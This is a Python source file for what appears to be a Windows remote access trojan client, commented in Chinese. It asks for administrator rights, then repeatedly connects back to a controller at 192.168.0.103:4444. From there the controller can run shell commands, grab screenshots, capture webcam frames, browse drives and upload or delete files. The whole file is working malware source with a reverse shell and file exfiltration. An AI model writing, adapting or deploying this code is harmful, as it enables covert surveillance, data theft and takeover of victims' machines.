import socket
import time
import os
import subprocess
import cv2
import numpy as np
import io
import struct
import mimetypes
import base64
import win32file
import win32api
import win32gui
import win32ui
import win32con
import win32net
import win32netcon
import pickle
import ctypes
import sys
import hashlib
import win32security
from PIL import ImageGrab, Image

IP, PORT = '192.168.0.103', 4444

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if getattr(sys, 'frozen', False):
        # 打包后的 exe 环境
        app_path = sys.executable
        cmd_args = sys.argv[1:]
    else:
        # 开发环境（.py）：需要把脚本路径也作为参数传给 python.exe
        app_path = sys.executable
        cmd_args = sys.argv  # sys.argv[0] 即 .py 脚本路径

    params = ' '.join([f'"{arg}"' if ' ' in arg else arg for arg in cmd_args])

    # 调用 Windows ShellExecuteW 请求提权
    ctypes.windll.shell32.ShellExecuteW(
        None,           # 父窗口句柄
        "runas",        # 动作：以管理员运行
        app_path,       # 要运行的程序路径
        params,         # 命令行参数
        None,           # 工作目录（默认当前）
        1               # 窗口状态（1 表示正常显示）
    )
    sys.exit()  # 退出当前未提权的进程


if not is_admin():
    run_as_admin()

while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((IP, PORT))

        while True:
            # 只读1字节，防止与后续指令粘包
            choice_raw = client.recv(1)
            if not choice_raw: break
            choice = choice_raw.decode()

            # 模块1：Shell模式
            if choice == '1':
                while True:
                    cmd = client.recv(1024).decode()
                    if cmd == '0':
                        break
                    if cmd.startswith('cd '):
                        try:
                            os.chdir(cmd[3:].strip())
                            output = f"CWD: {os.getcwd()}"
                        except Exception as e: output = str(e)
                    else:
                        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='gbk')
                        output = (res.stdout + res.stderr) or '(无输出)'
                                
                    out_bytes = output.encode('gbk', errors='ignore')
                    client.sendall(f"{len(out_bytes):08d}".encode() + out_bytes)

            # 模块2：屏幕监控
            elif choice == '2':
                while True:
                    raw_data = client.recv(1024)
                    if not raw_data:
                        break
                    action = raw_data.decode().strip()
                    if action == 'stop':
                        break
                    elif action == 'get':
                        # 内存处理，不写硬盘
                        img = ImageGrab.grab()
                        img_byte_arr = io.BytesIO()
                        img.save(img_byte_arr, format='JPEG', quality=30)
                        data = img_byte_arr.getvalue()
                        client.sendall(f"{len(data):08d}".encode() + data)

            # 模块3：摄像头监控
            elif choice == '3':
                cap = None
                try:
                    if os.name == 'nt':
                        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                    else:
                        cap = cv2.VideoCapture(0)
                    
                    print(f"[*] 摄像头开启状态: {cap.isOpened()}")
                    
                    while True:
                        raw_data = client.recv(1024)
                        if not raw_data:
                            break
                            
                        action = raw_data.decode().strip()
                        if action == 'stop': 
                            break
                        elif action == 'get':
                            if cap.isOpened():
                                ret, frame = cap.read()
                                if ret:
                                    _, img_encode = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                                    data = img_encode.tobytes()
                                else: 
                                    data = b''
                            else:
                                data = b''
                            client.sendall(f"{len(data):08d}".encode() + data)
                finally:
                    if cap is not None:
                        cap.release()
                    time.sleep(1)
            elif choice=='4':
                get_HD=win32api.GetLogicalDriveStrings()
                client.sendall(f"{len(get_HD):08d}".encode() + get_HD.encode())
                while True:
                    recv_sinter=client.recv(1024).decode().strip()
                    if recv_sinter == '0':
                        break
                    sinter_list=recv_sinter.split(maxsplit=1)
                    if not sinter_list:
                        continue
                    if sinter_list[0]=='look':
                        try:
                            files=os.listdir(sinter_list[1])
                            data=pickle.dumps(files)
                            client.sendall(f"{len(data):08d}".encode() + data)
                        except Exception as e:
                            err_bytes = str(e).encode()
                            client.sendall(f"{len(err_bytes):08d}".encode() + err_bytes)
                    elif sinter_list[0]=='get':
                        file_path=sinter_list[1]
                        try:
                            get_file_size=os.path.getsize(file_path)
                            client.sendall(f"{get_file_size:08d}".encode())
                            client.recv(1024)  # 等待服务端确认
                            with open(file_path,'rb') as f:
                                while True:
                                    chunk=f.read(4096)
                                    if not chunk:
                                        break
                                    client.sendall(chunk)
                        except Exception as e:
                            client.sendall(b"-0000001")  # 发送-1表示失败，区别于空文件
                    elif sinter_list[0]=='delete':
                        try:
                            os.remove(sinter_list[1])
                        except Exception:
                            pass
                    elif sinter_list[0]=='information':
                        try:
                            fileinformation=[]
                            #判断是否是文件夹
                            isfile=os.path.isfile(sinter_list[1])
                            if isfile:
                                fileinformation.append("[1] 类型：文件\n")
                            else:
                                fileinformation.append("[1] 类型：文件夹\n")
                            #文件大小
                            file_size=os.path.getsize(sinter_list[1])
                            fileinformation.append(f"[2] 文件大小：{file_size} 字节\n")
                            #文件创建时间
                            file_create_time=os.path.getctime(sinter_list[1])
                            fileinformation.append(f"[3] 创建时间：{time.ctime(file_create_time)}\n")
                            #文件最后修改时间
                            file_modify_time=os.path.getmtime(sinter_list[1])
                            fileinformation.append(f"[4] 修改时间：{time.ctime(file_modify_time)}\n")
                            #文件最后访问时间
                            file_access_time=os.path.getatime(sinter_list[1])
                            fileinformation.append(f"[5] 访问时间：{time.ctime(file_access_time)}\n")
                            #文件状态信息
                            file_stats=os.stat(sinter_list[1])
                            #获取文件权限
                            file_permissinon=file_stats.st_mode
                            fileinformation.append(f"[6] 文件权限：{oct(file_permissinon)}\n")
                            #获取文件incode
                            file_incode=file_stats.st_ino
                            fileinformation.append(f"[7] inode号：{file_incode}\n")
                            #获取文件硬件链接数
                            file_nlink=file_stats.st_nlink
                            fileinformation.append(f"[8] 硬链接数：{file_nlink}\n")
                            #获取文件属性值
                            file_attrs=os.stat(sinter_list[1]).st_file_attributes
                            fileinformation.append(f"[9] 属性值(原始)：{file_attrs}\n")
                            #获取文件哈希（仅文件，文件夹无法打开）
                            if isfile:
                                try:
                                    file_hash=hashlib.sha256()
                                    with open(sinter_list[1], 'rb') as f:
                                        while True:
                                            chunk=f.read(4096)
                                            if not chunk:
                                                break
                                            file_hash.update(chunk)
                                    fileinformation.append(f"[10] SHA256哈希：{file_hash.hexdigest()}\n")
                                except Exception:
                                    fileinformation.append("[10] SHA256哈希：无法计算\n")
                            else:
                                fileinformation.append("[10] SHA256哈希：不适用（文件夹）\n")
                            #获取文件所有者
                            try:
                                file_owner=win32security.GetFileSecurity(sinter_list[1], win32security.OWNER_SECURITY_INFORMATION)
                                file_owner_sid=file_owner.GetSecurityDescriptorOwner()
                                file_owner_name, file_owner_domain, _ = win32security.LookupAccountSid(None, file_owner_sid)
                                fileinformation.append(f"[11] 所有者：{file_owner_domain}\\{file_owner_name}\n")
                            except Exception:
                                fileinformation.append("[11] 所有者：无法获取\n")
                            #获取文件属性描述
                            file_attrs_val = os.stat(sinter_list[1]).st_file_attributes
                            attr_flags = []
                            if file_attrs_val & win32file.FILE_ATTRIBUTE_READONLY:
                                attr_flags.append("只读")
                            if file_attrs_val & win32file.FILE_ATTRIBUTE_HIDDEN:
                                attr_flags.append("隐藏")
                            if file_attrs_val & win32file.FILE_ATTRIBUTE_SYSTEM:
                                attr_flags.append("系统")
                            if file_attrs_val & win32file.FILE_ATTRIBUTE_ARCHIVE:
                                attr_flags.append("存档")
                            if file_attrs_val & win32file.FILE_ATTRIBUTE_NORMAL:
                                attr_flags.append("普通")
                            if file_attrs_val & win32file.FILE_ATTRIBUTE_COMPRESSED:
                                attr_flags.append("已压缩")
                            if file_attrs_val & 0x4000:  # FILE_ATTRIBUTE_ENCRYPTED
                                attr_flags.append("已加密")
                            if file_attrs_val & win32file.FILE_ATTRIBUTE_TEMPORARY:
                                attr_flags.append("临时")
                            if file_attrs_val & 0x10:  # FILE_ATTRIBUTE_DIRECTORY
                                attr_flags.append("目录")
                            fileinformation.append(f"[12] 属性描述：{', '.join(attr_flags) if attr_flags else '无特殊属性'}\n")

                            #获取文件完整路径
                            fileinformation.append(f"[13] 完整路径：{os.path.abspath(sinter_list[1])}\n")
                            #获取文件扩展名
                            _, ext = os.path.splitext(sinter_list[1])
                            fileinformation.append(f"[14] 扩展名：{ext if ext else '无'}\n")
                            #获取短路径名(8.3格式)
                            try:
                                short_path = win32api.GetShortPathName(sinter_list[1])
                                fileinformation.append(f"[15] 短路径名(8.3)：{short_path}\n")
                            except Exception:
                                fileinformation.append("[15] 短路径名(8.3)：无法获取\n")
                            #判断是否为符号链接/重解析点
                            try:
                                if os.path.islink(sinter_list[1]):
                                    fileinformation.append(f"[16] 符号链接目标：{os.readlink(sinter_list[1])}\n")
                            except Exception:
                                pass
                            #获取文件魔数（前16字节），用于识别文件真实类型
                            if isfile:
                                try:
                                    with open(sinter_list[1], 'rb') as fm:
                                        magic = fm.read(16)
                                    magic_hex = ' '.join(f'{b:02X}' for b in magic)
                                    magic_ascii = ''.join(chr(b) if 32 <= b < 127 else '.' for b in magic)
                                    fileinformation.append(f"[17] 文件魔数(hex)：{magic_hex}\n")
                                    fileinformation.append(f"[18] 文件魔数(文本)：{magic_ascii}\n")
                                except Exception:
                                    pass
                            #获取MIME类型
                            mime_type, _ = mimetypes.guess_type(sinter_list[1])
                            fileinformation.append(f"[19] MIME类型：{mime_type if mime_type else '未知'}\n")
                            #获取磁盘卷标和文件系统信息
                            try:
                                drive = os.path.splitdrive(sinter_list[1])[0] + '\\'
                                if drive:
                                    vol_name, vol_serial, max_component, fs_flags, fs_type = win32api.GetVolumeInformation(drive)
                                    fileinformation.append(f"[20] 磁盘卷标：{vol_name}\n")
                                    fileinformation.append(f"[21] 磁盘序列号：{vol_serial & 0xFFFFFFFF:08X}\n")
                                    fileinformation.append(f"[22] 文件系统：{fs_type}\n")
                                    # 文件系统特性（使用原始值避免 pywin32 常量缺失）
                                    fs_flag_list = []
                                    if fs_flags & 0x00000001:   # FILE_CASE_SENSITIVE_SEARCH
                                        fs_flag_list.append("区分大小写")
                                    if fs_flags & 0x00000002:   # FILE_CASE_PRESERVED_NAMES
                                        fs_flag_list.append("保留大小写")
                                    if fs_flags & 0x00000004:   # FILE_UNICODE_ON_DISK
                                        fs_flag_list.append("Unicode文件名")
                                    if fs_flags & 0x00000008:   # FILE_PERSISTENT_ACLS
                                        fs_flag_list.append("支持ACL")
                                    if fs_flags & 0x00000010:   # FILE_FILE_COMPRESSION
                                        fs_flag_list.append("支持文件压缩")
                                    if fs_flags & 0x00008000:   # FILE_VOLUME_IS_COMPRESSED
                                        fs_flag_list.append("卷已压缩")
                                    if fs_flags & 0x00020000:   # FILE_SUPPORTS_ENCRYPTION
                                        fs_flag_list.append("支持加密")
                                    fileinformation.append(f"[23] 文件系统特性：{', '.join(fs_flag_list) if fs_flag_list else '无'}\n")
                                else:
                                    fileinformation.append("[20-23] 磁盘信息：无法识别的盘符\n")
                            except Exception as e:
                                fileinformation.append(f"[20-23] 磁盘信息：获取失败 ({e})\n")
                            #对可执行文件/动态库获取版本信息
                            if isfile and ext.lower() in ('.exe', '.dll', '.sys', '.ocx', '.cpl', '.scr', '.msi'):
                                try:
                                    ver_info = win32api.GetFileVersionInfo(sinter_list[1], '\\')
                                    # 固定文件版本
                                    ms = ver_info.get('FileVersionMS', 0)
                                    ls = ver_info.get('FileVersionLS', 0)
                                    file_ver = f"{win32api.HIWORD(ms)}.{win32api.LOWORD(ms)}.{win32api.HIWORD(ls)}.{win32api.LOWORD(ls)}"
                                    fileinformation.append(f"[24] 文件版本：{file_ver}\n")
                                    # 产品版本
                                    product_ms = ver_info.get('ProductVersionMS', 0)
                                    product_ls = ver_info.get('ProductVersionLS', 0)
                                    product_ver = f"{win32api.HIWORD(product_ms)}.{win32api.LOWORD(product_ms)}.{win32api.HIWORD(product_ls)}.{win32api.LOWORD(product_ls)}"
                                    fileinformation.append(f"[25] 产品版本：{product_ver}\n")
                                    # 字符串信息
                                    lang, codepage = win32api.GetFileVersionInfo(sinter_list[1], '\\VarFileInfo\\Translation')[0]
                                    str_info_path = f'\\StringFileInfo\\{lang:04X}{codepage:04X}'
                                    ver_field_names = {
                                        'CompanyName': ('[26] 公司名称', '公司名称'),
                                        'FileDescription': ('[27] 文件描述', '文件描述'),
                                        'InternalName': ('[28] 内部名称', '内部名称'),
                                        'LegalCopyright': ('[29] 版权信息', '版权信息'),
                                        'OriginalFilename': ('[30] 原始文件名', '原始文件名'),
                                        'ProductName': ('[31] 产品名称', '产品名称'),
                                    }
                                    for key, (label, _) in ver_field_names.items():
                                        try:
                                            val = win32api.GetFileVersionInfo(
                                                sinter_list[1], f'{str_info_path}\\{key}')
                                            if val:
                                                fileinformation.append(f"{label}：{val}\n")
                                        except Exception:
                                            pass
                                except Exception:
                                    pass
                            #获取文件的DOS属性/是否为系统隐藏等（通过GetFileAttributes）
                            try:
                                dos_attrs = win32api.GetFileAttributes(sinter_list[1])
                                dos_flags = []
                                if dos_attrs & win32file.FILE_ATTRIBUTE_READONLY:
                                    dos_flags.append("R")
                                if dos_attrs & win32file.FILE_ATTRIBUTE_HIDDEN:
                                    dos_flags.append("H")
                                if dos_attrs & win32file.FILE_ATTRIBUTE_SYSTEM:
                                    dos_flags.append("S")
                                if dos_attrs & win32file.FILE_ATTRIBUTE_DIRECTORY:
                                    dos_flags.append("D")
                                if dos_attrs & win32file.FILE_ATTRIBUTE_ARCHIVE:
                                    dos_flags.append("A")
                                if dos_attrs & win32file.FILE_ATTRIBUTE_NORMAL:
                                    dos_flags.append("N")
                                fileinformation.append(f"[32] DOS属性标记：{''.join(dos_flags) if dos_flags else '无'}\n")
                            except Exception:
                                pass
                            #获取文件所在目录与文件名
                            file_dir = os.path.dirname(sinter_list[1])
                            file_name_only = os.path.basename(sinter_list[1])
                            fileinformation.append(f"[33] 所在目录：{file_dir}\n")
                            fileinformation.append(f"[34] 文件名：{file_name_only}\n")
                            #获取文件设备号和索引号（唯一标识文件）
                            try:
                                f_stat = os.stat(sinter_list[1])
                                fileinformation.append(f"[35] 设备号：{f_stat.st_dev}\n")
                                fileinformation.append(f"[36] 索引号：{f_stat.st_ino}\n")
                            except Exception:
                                pass

                            # ===== NTFS 文件引用号（MFT 条目） =====
                            if isfile:
                                try:
                                    handle = win32file.CreateFile(
                                        sinter_list[1],
                                        win32file.GENERIC_READ,
                                        win32file.FILE_SHARE_READ | win32file.FILE_SHARE_WRITE | win32file.FILE_SHARE_DELETE,
                                        None,
                                        win32file.OPEN_EXISTING,
                                        win32file.FILE_FLAG_BACKUP_SEMANTICS,
                                        None)
                                    try:
                                        file_info = win32file.GetFileInformationByHandle(handle)
                                        # nFileIndexHigh << 32 | nFileIndexLow = 64位文件引用号
                                        file_ref = (file_info.nFileIndexHigh << 32) | file_info.nFileIndexLow
                                        fileinformation.append(f"[37] NTFS文件引用号(MFT)：{file_ref}\n")
                                        fileinformation.append(f"[38] NTFS链接数：{file_info.nNumberOfLinks}\n")
                                        fileinformation.append(f"[39] NTFS卷序列号：{file_info.dwVolumeSerialNumber:08X}\n")
                                    finally:
                                        win32file.CloseHandle(handle)
                                except Exception:
                                    pass

                            # ===== ADS 备用数据流（NTFS） =====
                            try:
                                ads_list = []
                                kernel32 = ctypes.windll.kernel32

                                class LARGE_INTEGER(ctypes.Structure):
                                    _fields_ = [("QuadPart", ctypes.c_longlong)]

                                class WIN32_FIND_STREAM_DATA(ctypes.Structure):
                                    _fields_ = [
                                        ("StreamSize", LARGE_INTEGER),
                                        ("cStreamName", ctypes.c_wchar * (260 + 36)),
                                    ]

                                # 关键：设置 restype 防止 64 位句柄被截断
                                kernel32.FindFirstStreamW.restype = ctypes.c_void_p
                                kernel32.FindFirstStreamW.argtypes = [
                                    ctypes.c_wchar_p, ctypes.c_uint,
                                    ctypes.c_void_p, ctypes.c_uint]
                                kernel32.FindNextStreamW.restype = ctypes.c_bool
                                kernel32.FindNextStreamW.argtypes = [
                                    ctypes.c_void_p, ctypes.c_void_p]
                                kernel32.FindClose.restype = ctypes.c_bool
                                kernel32.FindClose.argtypes = [ctypes.c_void_p]

                                INVALID_HANDLE_VALUE = ctypes.c_void_p(-1)
                                FindStreamInfoStandard = 0

                                stream_data = WIN32_FIND_STREAM_DATA()
                                handle = kernel32.FindFirstStreamW(
                                    sinter_list[1], FindStreamInfoStandard,
                                    ctypes.byref(stream_data), 0)

                                if handle != INVALID_HANDLE_VALUE:
                                    while True:
                                        stream_name = stream_data.cStreamName
                                        stream_size = stream_data.StreamSize.QuadPart
                                        if stream_name == '::$DATA':
                                            ads_list.append(f"主数据流(::$DATA)：{stream_size} 字节")
                                        else:
                                            ads_list.append(f"ADS流({stream_name})：{stream_size} 字节")
                                        if not kernel32.FindNextStreamW(handle, ctypes.byref(stream_data)):
                                            break
                                    kernel32.FindClose(handle)
                                else:
                                    err = kernel32.GetLastError()
                                    ads_list.append(f"FindFirstStreamW 失败 (错误码: {err})")

                                if ads_list:
                                    fileinformation.append(f"[40] ADS数据流数量：{len(ads_list)}\n")
                                    for ads in ads_list:
                                        fileinformation.append(f"  └─ {ads}\n")
                                else:
                                    fileinformation.append("[40] ADS数据流：无\n")
                            except Exception as e:
                                fileinformation.append(f"[40] ADS数据流：无法获取（{e}）\n")

                            # ===== 文件图标提取（转为 Base64 PNG） =====
                            if isfile:
                                try:
                                    # 使用 SHGetFileInfoW 获取系统图标
                                    SHGFI_ICON = 0x100
                                    SHGFI_SMALLICON = 0x1

                                    class SHFILEINFOW(ctypes.Structure):
                                        _fields_ = [
                                            ("hIcon", ctypes.c_void_p),
                                            ("iIcon", ctypes.c_int),
                                            ("dwAttributes", ctypes.c_ulong),
                                            ("szDisplayName", ctypes.c_wchar * 260),
                                            ("szTypeName", ctypes.c_wchar * 80),
                                        ]

                                    shfi = SHFILEINFOW()
                                    flags = SHGFI_ICON | SHGFI_SMALLICON
                                    ctypes.windll.shell32.SHGetFileInfoW(
                                        sinter_list[1], 0, ctypes.byref(shfi),
                                        ctypes.sizeof(shfi), flags)

                                    if shfi.hIcon:
                                        hIcon = shfi.hIcon
                                        icon_index = shfi.iIcon
                                        fileinformation.append(f"[41] 系统图标索引：{icon_index}\n")

                                        # 使用 win32ui 创建 DC（比 raw GDI 更可靠）
                                        hdc_screen = win32gui.GetDC(0)
                                        screen_dc = win32ui.CreateDCFromHandle(hdc_screen)
                                        mem_dc = screen_dc.CreateCompatibleDC()
                                        # 显式创建 32-bit 位图，避免位深度不一致
                                        bmp = win32ui.CreateBitmap()
                                        bmp.CreateCompatibleBitmap(screen_dc, 32, 32)
                                        old_bmp = mem_dc.SelectObject(bmp)

                                        # 绘制图标到内存 DC
                                        mem_dc.DrawIcon((0, 0), hIcon)

                                        # 提取位图数据
                                        bmp_bits = bmp.GetBitmapBits(True)
                                        bmp_info = bmp.GetInfo()
                                        img = Image.frombuffer(
                                            'RGBA',
                                            (bmp_info['bmWidth'], bmp_info['bmHeight']),
                                            bmp_bits, 'raw', 'BGRA', 0, 1)

                                        # 转为 PNG base64
                                        buf = io.BytesIO()
                                        img.save(buf, format='PNG')
                                        icon_b64 = base64.b64encode(buf.getvalue()).decode()
                                        fileinformation.append(f"[42] 文件图标(Base64-PNG)：{icon_b64}\n")

                                        # 清理 GDI 资源
                                        mem_dc.SelectObject(old_bmp)
                                        win32gui.DeleteObject(bmp.GetHandle())
                                        mem_dc.DeleteDC()
                                        screen_dc.DeleteDC()
                                        win32gui.ReleaseDC(0, hdc_screen)
                                        ctypes.windll.user32.DestroyIcon(hIcon)
                                    else:
                                        fileinformation.append("[41-42] 文件图标：无法获取图标句柄\n")
                                except Exception as e:
                                    fileinformation.append(f"[41-42] 文件图标：无法提取（{e}）\n")
                            try:
                                # 如果是文件夹，跳过哈希获取（文件夹无法以二进制打开）
                                # 注：上面已判断 isfile，这里只是保证哈希部分不会被文件夹触发
                                # 将收集的信息拼接后发送
                                info_str = ''.join(fileinformation)
                                info_bytes = info_str.encode('gbk', errors='ignore')
                                client.sendall(f"{len(info_bytes):08d}".encode() + info_bytes)
                            except Exception as e:
                                err_msg = "发送文件信息错误：" + str(e)
                                err_bytes = err_msg.encode('gbk', errors='ignore')
                                client.sendall(f"{len(err_bytes):08d}".encode() + err_bytes)



                        except PermissionError:
                            err_msg = "权限不足"
                            err_bytes = err_msg.encode('gbk', errors='ignore')
                            client.sendall(f"{len(err_bytes):08d}".encode() + err_bytes)
                        except FileNotFoundError:
                            err_msg = "文件不存在"
                            err_bytes = err_msg.encode('gbk', errors='ignore')
                            client.sendall(f"{len(err_bytes):08d}".encode() + err_bytes)
                        except Exception as e:
                            err_msg = f"获取文件信息失败：{str(e)}"
                            err_bytes = err_msg.encode('gbk', errors='ignore')
                            client.sendall(f"{len(err_bytes):08d}".encode() + err_bytes)


                    
    except Exception as e:
        time.sleep(5)
    finally:
        client.close()